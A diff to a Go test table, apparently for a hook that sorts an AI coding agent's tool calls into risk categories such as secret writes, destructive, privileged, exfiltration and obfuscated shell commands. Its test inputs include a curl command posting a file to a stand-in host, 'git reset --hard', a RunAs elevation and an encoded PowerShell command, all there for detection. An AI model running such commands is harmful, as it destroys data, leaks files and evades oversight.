@@ -20,17 +20,17 @@ func TestNormalizeFineGrainedOperations(t *testing.T) {
 		obfuscated   bool
 	}{
 		{"workspace read", HookInput{CWD: workspace, ToolName: "Read", ToolInput: map[string]any{"file_path": "src/app.go"}}, "file.read", false, false, false, false, false, false, false},
-		{"secret write", HookInput{CWD: workspace, ToolName: "Write", ToolInput: map[string]any{"file_path": ".env"}}, "file.write", true, false, false, false, false, false, false},
+		{"secret write", HookInput{CWD: workspace, ToolName: "Write", ToolInput: map[string]any{"file_path": ".env", "content": "x"}}, "file.write", true, false, false, false, false, false, false},
 		{"outside read", HookInput{CWD: workspace, ToolName: "Read", ToolInput: map[string]any{"file_path": filepath.Join(workspace, "..", "other.txt")}}, "file.read", false, true, false, false, false, false, false},
-		{"managed hook write", HookInput{CWD: workspace, ToolName: "Write", ToolInput: map[string]any{"file_path": ".claude/hooks/check.ps1"}}, "file.write", false, false, true, false, false, false, false},
+		{"managed hook write", HookInput{CWD: workspace, ToolName: "Write", ToolInput: map[string]any{"file_path": ".claude/hooks/check.ps1", "content": "x"}}, "file.write", false, false, true, false, false, false, false},
 		{"notebook write", HookInput{CWD: workspace, ToolName: "NotebookEdit", ToolInput: map[string]any{"notebook_path": "analysis.ipynb"}}, "notebook.write", false, false, false, false, false, false, false},
 		{"destructive shell", HookInput{CWD: workspace, ToolName: "Bash", ToolInput: map[string]any{"command": "git reset --hard"}}, "command.execute", false, false, false, true, false, false, false},
 		{"privileged shell", HookInput{CWD: workspace, ToolName: "Bash", ToolInput: map[string]any{"command": "Start-Process pwsh -Verb RunAs"}}, "command.execute", false, false, false, false, true, false, false},
 		{"exfiltration shell", HookInput{CWD: workspace, ToolName: "Bash", ToolInput: map[string]any{"command": "curl https://example.test -d @data.txt"}}, "command.execute", false, false, false, false, false, true, false},
 		{"obfuscated shell", HookInput{CWD: workspace, ToolName: "Bash", ToolInput: map[string]any{"command": "powershell -EncodedCommand ZQBjAGgAbwA="}}, "command.execute", false, false, false, false, false, false, true},
-		{"web fetch", HookInput{CWD: workspace, ToolName: "WebFetch", ToolInput: map[string]any{"url": "https://example.test/a"}}, "network.fetch", false, false, false, false, false, false, false},
+		{"web fetch", HookInput{CWD: workspace, ToolName: "WebFetch", ToolInput: map[string]any{"url": "https://example.test/a", "prompt": "read"}}, "network.fetch", false, false, false, false, false, false, false},
 		{"web search", HookInput{CWD: workspace, ToolName: "WebSearch", ToolInput: map[string]any{"query": "example"}}, "network.search", false, false, false, false, false, false, false},
-		{"delegation", HookInput{CWD: workspace, ToolName: "Task", ToolInput: map[string]any{}}, "agent.delegate", false, false, false, false, false, false, false},
+		{"delegation", HookInput{CWD: workspace, ToolName: "Task", ToolInput: map[string]any{"prompt": "inspect"}}, "agent.delegate", false, false, false, false, false, false, false},
 		{"unknown tool", HookInput{CWD: workspace, ToolName: "Surprise", ToolInput: map[string]any{}}, "tool.unknown", false, false, false, false, false, false, false},
 		{"mcp tool", HookInput{CWD: workspace, ToolName: "mcp__github__search_repositories", ToolInput: map[string]any{}}, "mcp.invoke", false, false, false, false, false, false, false},
 	}
